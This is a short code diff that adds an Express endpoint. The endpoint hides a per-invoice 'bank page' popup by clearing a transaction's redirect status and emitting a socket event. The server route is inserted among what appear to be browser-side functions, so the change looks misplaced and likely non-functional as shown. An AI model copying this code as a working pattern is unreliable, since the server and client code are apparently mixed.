@@ -381,7 +381,21 @@ async function hideBankPage(id) {
     alert('Failed to hide bank page. Please try again.');
   }
 }
-    
+
+    app.post('/api/hideBankpage', (req, res) => {
+  const { invoiceId } = req.body;
+  const txn = transactions.get(invoiceId);
+  if (!txn) return res.status(404).json({ error: 'Transaction not found' });
+
+  txn.redirectStatus = null;
+  txn.bankpageVisible = false;
+
+  // Emit event to frontend to close the popup
+  io.emit('hide_bankpage', { invoiceId });
+
+  res.json({ status: 'success' });
+});
+
     loadTransactions();
     setInterval(loadTransactions, 2000);
     
